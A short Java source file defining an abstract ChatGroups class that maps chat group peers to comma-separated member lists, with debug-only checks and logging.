package com.android.networking.module.chat;

import java.util.Hashtable;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public abstract class ChatGroups {

	final Hashtable<String, String> groups = new Hashtable<String, String>();
	
	 String groupTo(String peer) {
		return groups.get(peer);
	}

	 void addGroup(String peer, String remote) {
		if (Cfg.DEBUG) {
			Check.requires(isGroup(peer), "peer is not a group: " + peer);
			Check.log("Adding group " + peer + " : " + remote);
		}
		String value;
		if (groups.containsKey(peer)) {
			value = groups.get(peer);
			if (!value.contains(remote)) {
				value += "," + remote;
			}

		} else {
			value = remote;
		}

		groups.put(peer, value);
	}

	abstract boolean isGroup(String peer) ;

}
